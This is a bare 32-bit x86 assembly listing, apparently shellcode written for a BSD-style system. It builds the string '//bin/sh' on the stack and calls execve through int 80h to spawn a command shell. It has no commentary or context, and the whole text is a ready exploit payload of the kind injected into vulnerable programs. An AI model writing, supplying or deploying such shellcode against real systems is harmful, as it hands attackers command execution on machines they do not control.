BITS 32
xor eax, eax
push eax
push 0x68732f6e
push 0x69622f2f
mov ebx, esp
push eax
push eax
push ebx
mov al, 59
push eax
int 80h

